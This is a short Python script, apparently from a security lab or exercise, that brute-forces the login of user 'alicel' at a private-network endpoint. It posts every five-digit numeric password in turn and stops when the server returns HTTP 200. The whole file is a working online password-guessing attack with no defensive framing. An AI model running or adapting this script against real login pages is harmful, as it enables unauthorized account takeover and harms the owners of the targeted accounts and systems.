import requests

username = 'alicel'
url = 'http://172.19.2.22:8080/welcome-safe'

for i in range(100000):
# for i in range(12340, 12350):
    num_str = '{:05d}'.format(i)
    print(num_str)
    res = requests.post(url, data={
        'username': username, 'password': num_str
    })
    if res.status_code == 200:
        print(f'{username} password found: {num_str}')
        break